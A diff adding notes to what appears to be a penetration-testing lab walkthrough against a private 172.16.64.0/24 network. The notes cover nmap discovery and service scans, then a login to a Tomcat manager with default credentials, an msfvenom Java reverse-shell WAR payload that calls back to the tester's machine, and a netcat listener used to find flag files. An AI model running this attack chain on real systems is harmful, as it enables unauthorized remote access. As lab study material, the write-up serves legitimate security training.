@@ -30,4 +30,78 @@
 
 `nmap -sn 172.16.64.0/24`
 
+```
+Nmap scan report for 172.16.64.101
+Host is up (0.12s latency).
+MAC Address: 00:50:56:A2:52:F0 (VMware)
+Nmap scan report for 172.16.64.140
+Host is up (0.11s latency).
+MAC Address: 00:50:56:A2:E4:85 (VMware)
+Nmap scan report for 172.16.64.182
+Host is up (0.059s latency).
+MAC Address: 00:50:56:A2:B1:61 (VMware)
+Nmap scan report for 172.16.64.199
+Host is up (0.057s latency).
+MAC Address: 00:50:56:A2:BF:51 (VMware)
+Nmap scan report for 172.16.64.10
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 5.24 seconds
+```
+Five hosts are up.
 
+Performing service detection scan against all targets.
+
+`sudo nmap -sV -sS -v 172.16.64.10,101,140,182,199 -oN servicescan.txt`
+
+Nmap results for `172.16.64.101` -pwn. 
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:50:56:A2:52:F0 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Nmap results for `172.16.64.140` -
+
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 00:50:56:A2:E4:85 (VMware)
+```
+Nmap results for `172.16.64.182`
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+MAC Address: 00:50:56:A2:B1:61 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Nmap results for `172.16.64.199`
+
+```
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000
+MAC Address: 00:50:56:A2:BF:51 (VMware)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+- Beginning with `172.16.64.101` and visiting the webserver over port 8080.
+
+Using DIRB with `dirb http://172.16.64.101:8080/ /usr/share/dirb/wordlists/vulns/apache.txt`
+
+Apache Tomcat Manager Auth Page at http://172.16.64.101:9080
+
+Logged into webapp with username: tomcat password: s3cret
+
+Uploaded .war file exploit with msfvenom (USE LHOST VPN IP!!)
+`msfvenom -p java/shell_reverse_tcp lhost=172.16.64.10 lport=1996 -f war -o 2pwn.war`
+Set up netcat listener and then deploy the 2pwn .war file
+`nc -lvnp 1996` 
+Remote connection made and locate the flag.txt files with `locate flag.txt`
+
+- Next target http://172.16.64.140:80
+- Apache httpd 2.4.18
